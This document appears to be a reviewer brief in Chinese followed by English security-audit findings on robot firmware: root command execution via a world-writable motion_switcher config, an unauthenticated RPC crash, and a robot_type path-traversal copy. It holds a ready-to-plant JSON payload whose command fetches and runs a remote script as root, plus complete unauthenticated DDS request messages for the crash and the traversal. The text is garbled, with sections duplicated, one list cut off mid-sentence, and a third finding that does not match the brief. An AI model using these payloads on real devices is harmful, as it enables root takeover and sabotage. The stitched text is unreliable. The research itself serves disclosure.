你负责复核(P0-flagship/ 与 P1-safety-availability/):
1. AUD-r3-motionsw-form-cmd-root-rce.md(P0,motion_switcher 服务 Cmd RCE)
2. AUD-r3-motionsw-rpc-unauth-crash.md(P1)
3. AUD-r3-aisport-config-oob-heapwrite.md(P0)

方法:报告引用了具体代码位置。相关模块在固件 module/motion_switcher、module/ai_sport、module/robot_type_service。二进制反汇编用 python tools\disasm.py <elf>(固件根目录下,支持符号名/地址,带字符串注释)。Python 直接 Grep/Read。

每份报告裁决: CONFIRMED / PARTIAL / REFUTED / UNVERIFIABLE + 1-2 行关键证据(文件:行号/偏移/符号)。甄别夸大:他们声称的 live 验证是他们环境的,你只核实固件代码事实(源可控性、汇点存在、守卫有无)。
标注与我们已有情报的重叠:我们已确认 ①DDS 总线零鉴权(lease/policy 从不读) ②chat_go/arm 路径穿越→bashrunner→root(CHAIN-D/E 已真机) ③ai_sport 配置 FMX 加密但 key 随固件(etc/key/aes_key.bin) ④rt/api/sport 7101/7105 零钳制。

返回紧凑 markdown 表:报告 | 裁决 | 关键证据 | 与已有情报关系(重叠/新增/矛盾)。不贴大段代码。

1	# Finding: AUD-r3-motionsw-form-cmd-root-rce
2	
3	## Primitive
4	Trust After Modification / Configuration Injection — a world-writable plaintext-JSON **root-Cmd-string config** (`form/<machinetype>`, 0666 in a 0777 dir, NO FMX) whose `Cmd` strings are executed through `system()` as root by the `motion_switcher_service` daemon, with (a) an **automatic fire at every daemon start** (no reload needed — stronger than the master_service service/*.json class), (b) an **unauthenticated remote fire trigger** (api 1002 SelectMode on bridge-registered `rt/api/motion_switcher/request`), and (c) a **precise suffix-defense verdict for the chain question**: the loader opens `form/<name>` by EXACT name (no directory enumeration anywhere on the load path), so a `.yaml`/`.md`/`.wav`/`@NNN`-suffixed plant in `form/` does NOT load — the write side of this chain is local/OTA-only today; the MTRaw filename leg is filed separately (AUD-r3-motionsw-mtraw-formfile-redirection).
5	
6	## Severity
7	HIGH (root RCE; write requires local presence / OTA tar / any unsuffixed write primitive — the same amplifier class as AUD-msvc-service-cmd-file-rce and AUD-bashrunner-worldwritable-whitelist; fire is remote AND automatic)
8	
9	## Condition Analysis
10	
11	### Summary
12	`motion_switcher_service` (root, auto-started, auto-restarted by the master_service monitor) is a mode-switching state machine whose entire behavior is defined by a **plaintext JSON "work form"** loaded from `/unitree/module/motion_switcher/form/<machinetype>` (`InitWorkForm`@0x229ba0 → `CheckForm`@0x22bda8 → `WorkForm::Init`@0x2a3cd0; the shipped R1 loads `form/0` — log line 4: `current form:0, formFileName:/unitree/module/motion_switcher//form/0`). Every mode entry in that file carries `Operation.Select/Release/SimpleRelease` lists of `{Cmd, ExpectCode, IgnoreUnexpected, Delay}` and `Operation.Check` lists of `{Cmd, TrueCode, FalseCode}`, and every `Cmd` string is passed **verbatim to `system()` as root** in `WorkForm::Execute`@0x2a5bec (`v4 = std::string::c_str(a2); v10 = system(v4)` — the ONLY process-creation call site in the whole 4.4 MB binary: `system@plt` has exactly one xref, and `nm -D` shows zero popen/exec*/fork/posix_spawn imports). The shipped `form/0` executes `/unitree/sbin/mscli startservice ai_sport` / `stopservice ai_sport` / `getenable ai_sport` — **1,768 demonstrable root exec events in the shipped log** (498 startservice + 27 stopservice + 1243 getenable), including the log line `execute cmd begin. cmdstr:/unitree/sbin/mscli startservice ai_sport` — the identical Cmd-string-through-shell pattern as `etc/master_service/service/*` (AUD-msvc-service-cmd-file-rce), but in a file with **no FMX encryption** (plaintext JSON — no crypto needed to forge) and with a **better trigger story**: unlike master_service (in-memory Cmd, needs `reloadservice`), motion_switcher re-reads `form/<name>` at EVERY process start and immediately executes the default mode's Select Cmds (`InitWorkForm` → `SelectDefault` retry loop, up to SelectDefaultRetries+1 = 6 attempts, 3 s apart). The file ships **0666 inside a 0777 directory** (stat-verified), and the daemon runs as **root**. The chain question this round asked — does the loader ENUMERATE the form dir (which would make a `.yaml`-suffipped plant load)? — is answered NO by exhaustive xref work: `WorkForm::Init` has exactly ONE caller (InitWorkForm@0x229d18), the path is built as `GetProcessDirectory(1) + "/form/" + formName` (literal `"/form/"`@0x386528), and the ONLY directory-enumeration code in the binary (`opendir`@0x21ff20 → `FileSystemHelper::Opendir`@0x313404 → `Directory::OpenInner`@0x2e8908 → `ListFile/ListDir/List`@0x2e7a50/0x2e7b7c/0x2e7dd4) is used solely by `LogKeeper::Rolling`@0x2c6018 (log rotation). Therefore the form filename must be exactly `"0"`, `"1"`, or the raw machinetype content — **no remote write primitive on this firmware produces an unsuffixed file at an attacker-chosen name**, so the R2-REVIEW suffix defense (scratchboard:139) HOLDS for this surface: `.yaml`/`.md`/`.wav`/`@NNN`/uuid4-named plants in `form/` never load. What remains is a local-amplifier/OTA root RCE with an unauthenticated remote trigger and an automatic fire — plus the MTRaw filename leg (separate finding) that would convert remote machinetype-content control into an arbitrary-path form load.
13	
14	### Pre-conditions
15	- **Write side (the ONE condition)**: any primitive that can create/overwrite a file named `0` (or `1`, or the MTRaw string) under `/unitree/module/motion_switcher/form/`. Available today: local unprivileged shell (dir is 0777, file 0666 — `stat -c '%a'` verified); the OTA tar (broker-blocked for remote, per field test); any future unsuffixed root write (e.g. the A1-chain `log_path` plog terminal — flagged for correlate, content likely JSON-invalid). Remote `.yaml`-suffix plants DO NOT load (exact-name open — the suffix defense holds).
16	- **Fire side (zero preconditions)**: automatic at the next daemon start — the daemon restarts routinely (252 starts in the shipped log; master_service monitor restarts dead children ~5 s; `motion_switcher` is NOT in robot_state's ProtectedService list so `RPCServiceSwitch` can restart it at will); or immediate and unauthenticated: `rt/api/motion_switcher/request` api 1002 `{"name":"<mode-from-poisoned-form>"}` (bridge writer row 16, WebRTC-registered at webrtc_bridge.LOG:5400, live production traffic at :3375).
17	- No authentication, no FMX knowledge, no crypto.
18	
19	### Data Flow (attacker's actions and the application's response)
20	1. **Plant** — write a form file at `form/0` (local shell: `cp payload /unitree/module/motion_switcher/form/0`; or OTA tar member `../../../../unitree/module/motion_switcher/form/0`). The payload is ordinary JSON — plaintext, no FMX:
21	   ```json
22	   {"Name":"G1","DefaultMode":"pwn",
23	    "ModeList":[{"Name":"pwn","Alias":"pwn",
24	      "SelectEventKeyList":["R1","L1","A"],
25	      "Operation":{
26	        "Select":[{"Cmd":"/bin/sh -c 'curl http://192.168.123.10/x|sh'","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
27	        "Release":[{"Cmd":"true","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
28	        "SimpleRelease":[{"Cmd":"true","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
29	        "Check":[{"Cmd":"true","TrueCode":[0],"FalseCode":[1]}]}}]}
30	   ```
31	   Application: file accepted — the loader performs no integrity/permission/origin check of any kind (WorkForm::Init@0x2a3cd0 → LoadFile@0x310fbc → FromJsonString@0x2d2828).
32	2. **Fire, variant A (automatic)** — any daemon restart (routine, monitor-driven, RPCServiceSwitch-driven, or reboot): `InitWorkForm`@0x229ba0 loads `form/0`, `SelectDefault`@0x2a4420 runs the `Check` Cmd (`true` → false list? CheckMode iterates modes until TrueCode) then selects `DefaultMode:"pwn"` → `ExecuteSelect`@0x2a51a0 → `ExecuteControlCmd`@0x2a5830 → `WorkForm::Execute`@0x2a5bec → `system("/bin/sh -c 'curl …|sh'")` **as root**. This is exactly the shipped behavior — the production log shows this sequence (getenable → startservice) 252 times.
33	3. **Fire, variant B (remote, on demand)** — DDS publish to `rt/api/motion_switcher/request` `{"header":{"identity":{"api_id":1002}},"parameter":"{\"name\":\"pwn\"}"}`: `ServerRequestHandler`@0x327f10 dispatches with lease=0 (no auth) → `RPCSelectMode`@0x22ab0c → `WorkForm::Select("pwn")` → name resolves in the poisoned form → `SelectMode`@0x2a4a00 → `ExecuteSelect` → `system()` as root. Rate-limited only by the 5 s `SwitchInterval` (`CheckBusy`@0x22ba80). Reachable near-source unconditionally (shipped DDS identity, E9-auth) and through the WebRTC data channel (bridge writer row 16 — same position as the live api-1001 traffic at webrtc_bridge.LOG:3375).
34	4. **Fire, variant C (remote, physical)** — with `SelectEventKeyList` set in the payload, a single DDS write to `rt/lf/lowstate` with `wireless_remote[2..3]` = the key bitmask (e.g. R1|L1|A = 0x1|0x2|0x100 = 0x103 → `bytes[2]=0x03, bytes[3]=0x01`; key values from the static table @0x44AF68: R1=1 L1=2 START=4 SELECT=8 R2=0x10 L2=0x20 F1=0x40 F2=0x80 A=0x100 B=0x200 X=0x400 Y=0x800 UP=0x1000 RIGHT=0x2000 DOWN=0x4000 LEFT=0x8000) triggers `LowStateHandler`@0x22b938 → `Joystick::OnClick`@0x221b00 → `OnJoystickEvent`@0x22b8d8 → jsevent thread → `WorkForm::OnEvent`@0x2a42e0 → `Select("pwn")` → root `system()`. (On the SHIPPED form this leg is INERT — `SelectEventKeyList` is empty, `AddEvent(int)` has zero code xrefs, and the entire shipped log contains ZERO "on event" lines; it becomes live only via the poisoned form, i.e. it is a redundant trigger, not an independent bug.)
35	
36	### Taint Trace
37	```
38	Source: form/0 content (local write / OTA tar; NOT remotely writable today — exact-name load, suffix defense holds)
39	  ↓ open("/unitree/module/motion_switcher//form/0") — InitWorkForm@0x229ba0 path build, EXACT name (xref-proven: WorkForm::Init single caller; no enumeration)
40	    Guard: NONE (no signature, no permission check, no origin check; plaintext JSON, no FMX)
41	  ↓ rapidjson parse → std::map<string,Any> → WorkFormInfo/ModeInfo/Operation/ControlCmd::fromJson (0x2a6db4/0x231eac/0x23198c/0x2313bc)
42	    Guard: schema presence only (missing/wrong-typed keys throw — crash, not a guard)
43	  → Sink: system(cmd.c_str()) — WorkForm::Execute@0x2a5bec — EFFECT: EXEC, as root
44	    Reached by: SelectDefault (every daemon start, automatic) | RPC api 1001/1002/1003 (unauth DDS/WebRTC) | joystick event (form-defined, inert on shipped file)
45	Vulnerability class: Trust After Modification (config-as-code executed as root from a world-writable file)
46	```
47	
48	### Guard Assessment
49	| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
50	|---|-------|----------|---------------|------------|-------------|
51	| 1 | file permissions | form/ dir 0777, form/0 0666 | nothing (world-writable by design) | NO | any local user / any file-write primitive overwrites the file; `system()` runs as root |
52	| 2 | format integrity | FromJsonString@0x2d2828 | JSON well-formedness | NO as a guard | plaintext JSON — attacker authors the file; FMX absent (unlike cmd/*.fmx in master_service) |
53	| 3 | mode-name allowlist | WorkForm::GetName@0x2a5428 | RPC-supplied name must be a form mode | NO | the allowlist is the attacker's own file once form/0 is planted |
54	| 4 | exact-name load (vs enumeration) | InitWorkForm@0x229ba0 | the loader opens exactly form/<name> | YES — this is the suffix defense | verified: single caller of WorkForm::Init; the binary's only opendir consumer is log rotation ⇒ `.yaml`/`.md`/`.wav`/`@NNN` plants never load — the REMOTE write side of this chain stays closed |
55	| 5 | exec-call constraint | WorkForm::Execute@0x2a5bec | (none) — single system() sink | NO | no quoting, no allowlist, no argv-array exec; full shell metacharacter freedom in `Cmd` |
56	| 6 | RPC auth | RegistHandler(...,0)@0x22a0c8 | lease disabled; no peer auth | NO | unauth DDS / WebRTC-registered topic |
57	
58	### Impact
59	- **Root RCE** on overwrite of `form/0`: full shell (Cmd strings run through `system()` — pipes, redirects, arbitrary binaries), persistent across reboots (file survives; fires at every start).
60	- **Trigger quality** — three independent fires: automatic at every daemon start (no attacker interaction after the write), unauthenticated remote SelectMode, and (with the payload's own SelectEventKeyList) an rt/lf/lowstate key-combo trigger. The automatic fire makes this strictly stronger than the master_service service/*.json class (which needs `reloadservice` to re-arm).
61	- **Local-amplifier value**: converts ANY local foothold (unpriv shell, any LAN-reachable local-write bug) into root — joining bashrunner's whitelist dirs, master_service's service dir, log_system's config, vui's espeak data and ai_sport's config tree as the firmware's "world-writable → root" tier. The OTA tar path (tar-slip into form/0) is already covered by AUD-ota-tar-traversal.
62	- **Honest bound**: with today's primitive inventory the WRITE is not remote (suffix defense holds; form name "0" is unsuffixed) — the finding is rated as the local/OTA amplifier + remote trigger, exactly like its same-class siblings. # Finding: AUD-r3-motionsw-form-cmd-root-rce

## Primitive
Trust After Modification / Configuration Injection — a world-writable plaintext-JSON **root-Cmd-string config** (`form/<machinetype>`, 0666 in a 0777 dir, NO FMX) whose `Cmd` strings are executed through `system()` as root by the `motion_switcher_service` daemon, with (a) an **automatic fire at every daemon start** (no reload needed — stronger than the master_service service/*.json class), (b) an **unauthenticated remote fire trigger** (api 1002 SelectMode on bridge-registered `rt/api/motion_switcher/request`), and (c) a **precise suffix-defense verdict for the chain question**: the loader opens `form/<name>` by EXACT name (no directory enumeration anywhere on the load path), so a `.yaml`/`.md`/`.wav`/`@NNN`-suffixed plant in `form/` does NOT load — the write side of this chain is local/OTA-only today; the MTRaw filename leg is filed separately (AUD-r3-motionsw-mtraw-formfile-redirection).

## Severity
HIGH (root RCE; write requires local presence / OTA tar / any unsuffixed write primitive — the same amplifier class as AUD-msvc-service-cmd-file-rce and AUD-bashrunner-worldwritable-whitelist; fire is remote AND automatic)

## Condition Analysis

### Summary
`motion_switcher_service` (root, auto-started, auto-restarted by the master_service monitor) is a mode-switching state machine whose entire behavior is defined by a **plaintext JSON "work form"** loaded from `/unitree/module/motion_switcher/form/<machinetype>` (`InitWorkForm`@0x229ba0 → `CheckForm`@0x22bda8 → `WorkForm::Init`@0x2a3cd0; the shipped R1 loads `form/0` — log line 4: `current form:0, formFileName:/unitree/module/motion_switcher//form/0`). Every mode entry in that file carries `Operation.Select/Release/SimpleRelease` lists of `{Cmd, ExpectCode, IgnoreUnexpected, Delay}` and `Operation.Check` lists of `{Cmd, TrueCode, FalseCode}`, and every `Cmd` string is passed **verbatim to `system()` as root** in `WorkForm::Execute`@0x2a5bec (`v4 = std::string::c_str(a2); v10 = system(v4)` — the ONLY process-creation call site in the whole 4.4 MB binary: `system@plt` has exactly one xref, and `nm -D` shows zero popen/exec*/fork/posix_spawn imports). The shipped `form/0` executes `/unitree/sbin/mscli startservice ai_sport` / `stopservice ai_sport` / `getenable ai_sport` — **1,768 demonstrable root exec events in the shipped log** (498 startservice + 27 stopservice + 1243 getenable), including the log line `execute cmd begin. cmdstr:/unitree/sbin/mscli startservice ai_sport` — the identical Cmd-string-through-shell pattern as `etc/master_service/service/*` (AUD-msvc-service-cmd-file-rce), but in a file with **no FMX encryption** (plaintext JSON — no crypto needed to forge) and with a **better trigger story**: unlike master_service (in-memory Cmd, needs `reloadservice`), motion_switcher re-reads `form/<name>` at EVERY process start and immediately executes the default mode's Select Cmds (`InitWorkForm` → `SelectDefault` retry loop, up to SelectDefaultRetries+1 = 6 attempts, 3 s apart). The file ships **0666 inside a 0777 directory** (stat-verified), and the daemon runs as **root**. The chain question this round asked — does the loader ENUMERATE the form dir (which would make a `.yaml`-suffipped plant load)? — is answered NO by exhaustive xref work: `WorkForm::Init` has exactly ONE caller (InitWorkForm@0x229d18), the path is built as `GetProcessDirectory(1) + "/form/" + formName` (literal `"/form/"`@0x386528), and the ONLY directory-enumeration code in the binary (`opendir`@0x21ff20 → `FileSystemHelper::Opendir`@0x313404 → `Directory::OpenInner`@0x2e8908 → `ListFile/ListDir/List`@0x2e7a50/0x2e7b7c/0x2e7dd4) is used solely by `LogKeeper::Rolling`@0x2c6018 (log rotation). Therefore the form filename must be exactly `"0"`, `"1"`, or the raw machinetype content — **no remote write primitive on this firmware produces an unsuffixed file at an attacker-chosen name**, so the R2-REVIEW suffix defense (scratchboard:139) HOLDS for this surface: `.yaml`/`.md`/`.wav`/`@NNN`/uuid4-named plants in `form/` never load. What remains is a local-amplifier/OTA root RCE with an unauthenticated remote trigger and an automatic fire — plus the MTRaw filename leg (separate finding) that would convert remote machinetype-content control into an arbitrary-path form load.

### Pre-conditions
- **Write side (the ONE condition)**: any primitive that can create/overwrite a file named `0` (or `1`, or the MTRaw string) under `/unitree/module/motion_switcher/form/`. Available today: local unprivileged shell (dir is 0777, file 0666 — `stat -c '%a'` verified); the OTA tar (broker-blocked for remote, per field test); any future unsuffixed root write (e.g. the A1-chain `log_path` plog terminal — flagged for correlate, content likely JSON-invalid). Remote `.yaml`-suffix plants DO NOT load (exact-name open — the suffix defense holds).
- **Fire side (zero preconditions)**: automatic at the next daemon start — the daemon restarts routinely (252 starts in the shipped log; master_service monitor restarts dead children ~5 s; `motion_switcher` is NOT in robot_state's ProtectedService list so `RPCServiceSwitch` can restart it at will); or immediate and unauthenticated: `rt/api/motion_switcher/request` api 1002 `{"name":"<mode-from-poisoned-form>"}` (bridge writer row 16, WebRTC-registered at webrtc_bridge.LOG:5400, live production traffic at :3375).

1. **Plant** — write a form file at `form/0` (local shell: `cp payload /unitree/module/motion_switcher/form/0`; or OTA tar member `../../../../unitree/module/motion_switcher/form/0`). The payload is ordinary JSON — plaintext, no FMX:
   ```json
   {"Name":"G1","DefaultMode":"pwn",
    "ModeList":[{"Name":"pwn","Alias":"pwn",
      "SelectEventKeyList":["R1","L1","A"],
      "Operation":{
        "Select":[{"Cmd":"/bin/sh -c 'curl http://192.168.123.10/x|sh'","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
        "Release":[{"Cmd":"true","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
        "SimpleRelease":[{"Cmd":"true","ExpectCode":[0],"IgnoreUnexpected":true,"Delay":0}],
        "Check":[{"Cmd":"true","TrueCode":[0],"FalseCode":[1]}]}}]}

CheckMode iterates modes until TrueCode) then selects `DefaultMode:"pwn"` → `ExecuteSelect`@0x2a51a0 → `ExecuteControlCmd`@0x2a5830 → `WorkForm::Execute`@0x2a5bec → `system("/bin/sh -c 'curl …|sh'")` **as root**. 3. **Fire, variant B (remote, on demand)** — DDS publish to `rt/api/motion_switcher/request` `{"header":{"identity":{"api_id":1002}},"parameter":"{\"name\":\"pwn\"}"}`: `ServerRequestHandler`@0x327f10 dispatches with lease=0 (no auth) → `RPCSelectMode`@0x22ab0c → `WorkForm::Select("pwn")` → name resolves in the poisoned form → `SelectMode`@0x2a4a00 → `ExecuteSelect` → `system()` as root. 1	# Finding: AUD-r3-motionsw-rpc-unauth-crash
2	
3	## Primitive
4	Logic Bug / Data Flow Violation (uncaught-exception process abort) — four of the seven unauthenticated RPC handlers on `rt/api/motion_switcher/request` (api 1002 SelectMode, 1003 ReleaseMode, 1004 SetSilent, 1006 SetDefaultMode) parse the attacker-controlled `parameter` JSON through an exception-throwing conversion chain (`FromJsonString` → `AnyCast`/`AnyNumberCast`) that has **no catch handler anywhere between the handler body and the pthread entry routine** (`Thread::Wrap`@0x2e6f10 — the same SDK `Thread::Wrap`-no-catch defect already proven in AUD-logsys-crash-uncaught-json), so a single malformed DDS message produces `std::terminate()` → abort of the root daemon, with the master_service monitor restarting it into a repeatable crash-loop.
5	
6	## Severity
7	HIGH (unauthenticated, single-message, deterministic root-daemon kill + sustained crash-loop DoS of the robot's mode-switching service; no data exfiltration or code exec)
8	
9	## Condition Analysis
10	
11	### Summary
12	`Server::ServerRequestHandler`@0x327f10 receives every request on `rt/api/motion_switcher/request` (registered WebRTC bridge writer row 16 — webrtc_bridge.LOG:5400 — with **live production traffic** at webrtc_bridge.LOG:3375 proving the remote path is exercised: `{"type":"req","topic":"rt/api/motion_switcher/request","data":{"header":{"identity":{"id":905492468,"api_id":1001}},"parameter":""}}`), dispatches by `api_id` with the lease flag disabled (`RegistHandler(id, fn, 0)` for all seven handlers, Init@0x22a0c8), and calls the handler with `Request_.parameter` verbatim. Four handlers immediately parse that string: `RPCSelectMode`@0x22ab0c and `RPCSetDefaultMode`@0x22b3e0 via `FromJsonString<JsonizeModeName>` (required key `"name"`: `map["name"]` + `FromJson<std::string>`, JsonizeModeName::fromJson@0x230644); `RPCSetSilent`@0x22b134 via `FromJsonString<JsonizeSilent>` (required key `"silent"`: `FromJson<bool>` — JsonizeSilent::fromJson@0x230ca4); `RPCReleaseMode`@0x22ad70 via `FromJsonString<JsonizeRelease>` (optional key `"simple"` as bool, JsonizeRelease::fromJson@0x230a04 — the only handler that checks for empty parameter first). The parse chain throws on three distinct attacker-selected conditions: (1) **invalid JSON** → `JsonException` (`FromJsonString`@0x2d2828, json.cpp:268 — `HasParseError` → `__cxa_throw`); (2) **empty parameter string** → empty `Any` → `FromAny(Jsonize)`@0x2e1ac4 → `AnyCast<std::map<std::string,Any>>`@0x23b5c4 throws `BadCastException` (any.hpp:277 — type mismatch on an empty Any); (3) **wrong-typed or missing required field** → `map[]` inserts an empty `Any` → `FromJson<bool>`/`FromJson<string>` → `AnyNumberCast`@0x2bf730 throws `BadCastException` (any.hpp:349 — "AnyNumberCast error. not number type"; AnyCast on a non-string Any likewise). None of these frames has a `try` block: I decompiled the entire chain — `RPCSelectMode`/`RPCSetSilent`/`RPCSetDefaultMode`/`RPCReleaseMode` → `ServerRequestHandler`@0x327f10 (no catch) → `ServerStub::QueueThreadFunction`@0x32fcc0 (no catch; a bare `while(1){ Get; operator(); }` loop) → `Thread::Wrap`@0x2e6f10 (no catch — `std::function<Any()>::operator()` then a virtual call, no handler) → pthread entry `sub_2E6D38`@0x2e6d38 (`SetName; SetCpu; Wrap` — no catch). An exception escaping the pthread start routine invokes `std::terminate()` → `abort()` → the root process dies. The master_service monitor polls children ~every 5 s and restarts dead ones (R2-REVIEW scratchboard:143 — "dead children are auto-restarted, crash loops are real"), so a single attacker message becomes a self-healing crash-loop target: repeat at ≤5 s cadence to keep the mode-switching service permanently down (each restart also re-runs the full form Cmd sequence — see AUD-r3-motionsw-form-cmd-root-rce). This is the identical SDK defect class already accepted as AUD-logsys-crash-uncaught-json for LogStreamService; this finding extends it to motion_switcher with three new trigger shapes (empty parameter on 1002/1006; missing-`silent` on 1004; wrong-typed `simple` on 1003) and live-traffic proof of the topic's remote reachability.

## Primitive

## Severity
HIGH (unauthenticated, single-message, deterministic root-daemon kill + sustained crash-loop DoS of the robot's mode-switching service; no data exfiltration or code exec)

## Condition Analysis

### Summary
`Server::ServerRequestHandler`@0x327f10 receives every request on `rt/api/motion_switcher/request` (registered WebRTC bridge writer row 16 — webrtc_bridge.LOG:5400 — with **live production traffic** at webrtc_bridge.LOG:3375 proving the remote path is exercised: `{"type":"req","topic":"rt/api/motion_switcher/request","data":{"header":{"identity":{"id":905492468,"api_id":1001}},"parameter":""}}`), dispatches by `api_id` with the lease flag disabled (`RegistHandler(id, fn, 0)` for all seven handlers, Init@0x22a0c8), and calls the handler with `Request_.parameter` verbatim. # Finding: AUD-robottype-traversal-copy

## Primitive
File Upload / Path Traversal (arbitrary-source recursive copy + fixed-destination overwrite as root) — chain class: **config corruption / machine-variant swap / filesystem exhaustion**, not direct RCE.

## Severity
HIGH (unauthenticated, remote, root-privileged file-replacement primitive over the robot's machine-config directory; honest bound: no code-exec consumer found — see Impact)

## Condition Analysis

### Summary
`robot_type_api_server` (root daemon, `etc/master_service/service/robot_type_service`, started via start-stop-daemon as root) exposes four unauthenticated DDS RPC handlers on `rt/api/robot_type_service/request` registered by `RobotTypeServer::Init@0x830a8` at `../api/robot_type_server.cpp:24-27` with `RegistHandler(apiId, fn, /*lease=*/false)` (verified: `mov w3, #0` before each `bl RegistHandler@0xa4098`). Handler 1002 `Set_Robot_Type@0x84ea8` parses a JSON parameter whose sole field is `{"version": <string>}` (`Set_Robot_Type_Parameter::fromJson`, `robot_type_server_api.hpp:58`, field name string at 0x169d08) with **no validation of any kind**, then at `robot_type_server.cpp:89` calls `copyVersionSourceFiles@0x824e0(version)`. That function builds `source = "/unitree/module/robot_type_service/robot_type_source_file" + "/" + version` (constant @0x1695b0 + separator "/" @0x1695f0, `robot_type_server.cpp:163`), checks only that the source exists (`fs::exists` @:168 via `fs::status` PLT@0x52c80), then at `:174` calls `std::filesystem::create_directories("/unitree/robot/basic")` (PLT@0x53840) and at `:177` calls `std::filesystem::copy(source, "/unitree/robot/basic", std::filesystem::copy_options(0xA))` (`mov w2, #10` @0x82764, throwing overload PLT@0x54a50) — **as root**. Because `version` is concatenated verbatim, any `../` sequence traverses: `{"version":"../../../<any path>"}` makes the copy source any readable file or directory on the filesystem while the destination stays the fixed `/unitree/robot/basic`. The shipped `robot_type_source_file/` contains only `1/` and `2/` (each `basic_motor.json`, `basic_service.json`, `machinetype`) — i.e. the "version" is normally a one-character machine-variant id, and the API is a factory provisioning hook exposed on the network.

The exact copy semantics were verified by disassembling the shipped `module/r1_arm_example/lib/libstdc++.so.6.0.34` `std::filesystem::copy(const path&, const path&, copy_options, error_code&)` @0x132a5c:
- `copy_options 0xA` = `recursive(8) | overwrite_existing(2)` (libstdc++ `copy_options` bit layout: none=0, skip_existing=1, overwrite_existing=2, update_existing=4, recursive=8, copy_symlinks=0x10, skip_symlinks=0x20, directories_only=0x40, create_symlinks=0x80, create_hard_links=0x100).
- Because `(options & 0xB0) == 0`, the source is statted with **`stat()`**, not `lstat()` (0x132a98 `b.eq` → 0x132ad0 `bl stat`) — **symlinks in the source path are followed and the target's CONTENT is copied**, not the link.
- **Single-file source**: at 0x132c20-0x132c94 the code computes `from.filename()` (0x132c34) then `to / from.filename()` (0x132c44 `operator/`) and calls `do_copy_file(from, to/from.filename(), …)`. So **a single file source IS planted into `/unitree/robot/basic/` under its own basename** — this answers hunt-item #1 affirmatively.
- **Directory source**: 0x132cf0 `tbnz w20,#3` (recursive) → 0x132e8c; if `to` absent → `create_directory(to, from)` (0x132cfc), then a `directory_iterator` loop at 0x132d94-0x132df4 that calls `fs::copy(entry.path(), to / entry.path().filename(), options)` for **every** entry. There is **no symlink-skip check in the loop**, and the recursive call passes the same options (0xA) so `stat()` is used again — symlinks inside a copied tree are dereferenced and their target content planted.
- `equivalent(from, to)` → `EEXIST` error (0x132b88); `from` dir + `to` regular file → `EISDIR` (0x132bcc). Both raise `filesystem_error`.
- Errors do **not** crash the daemon: `copyVersionSourceFiles` has its own `try/catch` (landing pad at 0x82e54 = `__cxa_begin_catch`, `robot_type_server.cpp:183-185`, log string "拷贝版本{}源文件异常: {}" @0x1696d0) and `Set_Robot_Type` has a second one (0x8571c, `:103-108`, "Set_Robot_Type异常: {}" @0x169ac0). The `Thread::Wrap`/`ServerStub::QueueThreadFunction` chain has no catch, but it is never reached.

### Pre-conditions
- Attacker can publish to the DDS topic `rt/api/robot_type_service/request` (any LAN peer on 192.168.123.0/24 — cyclonedds.xml binds DDS to eth0; per scratchboard reachability correction the robot's own wlan1 AP subnet does *not* reach DDS), **or** rides the WebRTC data channel: `rt/api/robot_type_service/request` is a registered bridge publisher and `.../response` a registered subscriber (`var/log/webrtc_bridge/webrtc_bridge.LOG:5402` and `:5432`), and the shipped log contains live production traffic on this exact topic — `webrtc_bridge.LOG:6344`: `{"type":"req","topic":"rt/api/robot_type_service/request","data":{"header":{"identity":{"id":3,"api_id":1001}},"parameter":"{\"version\":\"\"}"}}` (2026-07-20 16:05:27). This closes inventory gap **G6**.
- No authentication, no lease, no token — `RegistHandler`'s third argument is 0 for all four handlers (`robot_type_server.cpp:24-27`).
- The service runs as **root** (`etc/master_service/service/robot_type_service` Start Cmd, `--exec /unitree/module/robot_type_service/robot_type_api_server`, start-stop-daemon as root).
- Source path must exist (`fs::exists` @:168) — trivially satisfiable for any real file/dir.
- An unauthenticated LAN peer / WebRTC peer meets ALL pre-conditions.

### Data Flow
1. Attacker publishes to `rt/api/robot_type_service/request`:
   `{"header":{"identity":{"id":1,"api_id":1002}},"parameter":"{\"version\":\"../../../unitree\"}"}`
   Application: `ServerStub::QueueThreadFunction@0xace48` → handler table → `Set_Robot_Type@0x84ea8` (`robot_type_server.cpp:60` "调用Set_Robot_Type API").
2. `Set_Robot_Type_Parameter::fromJson` (`robot_type_server_api.hpp:58`) extracts `version` — no charset, length, or format check.
3. `robot_type_server.cpp:84` — `updateVersionInFile("/unitree/robot/info/robot_type", "../../../unitree")` writes the raw string into `/unitree/robot/info/robot_type` (see the companion finding).
4. `robot_type_server.cpp:89` — `copyVersionSourceFiles("../../../unitree")`.
5. `robot_type_server.cpp:163` — `source = "/unitree/module/robot_type_service/robot_type_source_file/../../../unitree"` (resolves to `/unitree`).
6. `:168` `fs::exists(source)` → true. `:174` `create_directories("/unitree/robot/basic")` (no-op, exists). `:177` `fs::copy(/unitree, /unitree/robot/basic, recursive|overwrite_existing)` **as root**.
7. `fs::copy` iterates `/unitree` recursively. When it reaches the `/unitree/robot` entry it recurses into `/unitree/robot/basic`, and copying that directory into `/unitree/robot/basic/robot/basic` starts a **self-inclusive, unbounded recursion**: each level materialises one more `robot/basic/` nesting level containing everything already copied. Result: unbounded write amplification into `/unitree` (disk exhaustion — the same filesystem that holds `config_service` calibration state and audio_hub data per the mod-010 finding) and unbounded C++ recursion depth in `fs::copy` (stack overflow risk; SIGSEGV would not be caught by the `catch`).
8. Simpler variants (all single-request, no traversal-depth needed):
   - `{"version":"../../../robot/basic"}` → `equivalent(from,to)` → `EEXIST` → caught → `code:-1`. (Harmless — listed to show the guard.)
   - `{"version":"../../../module/basic_service"}` → plants `basic_service.json`, `basic_motor.json`, `basic_protect.json`, `io`, `publisher`, `basic.log*`, `ABPR_APTX_ankle.csv`, `lowcmd.csv`, `lowstate.csv`, … into `/unitree/robot/basic/` as root, **overwriting** the live `basic_service.json` / `basic_motor.json` with the factory-default copies and dropping ~6 MB of binaries and CSVs beside them.
   - `{"version":"../../../robot/info/robot_type"}` → single-FILE source → planted at `/unitree/robot/basic/robot_type` (its basename) with the attacker-controlled content written in step 3.
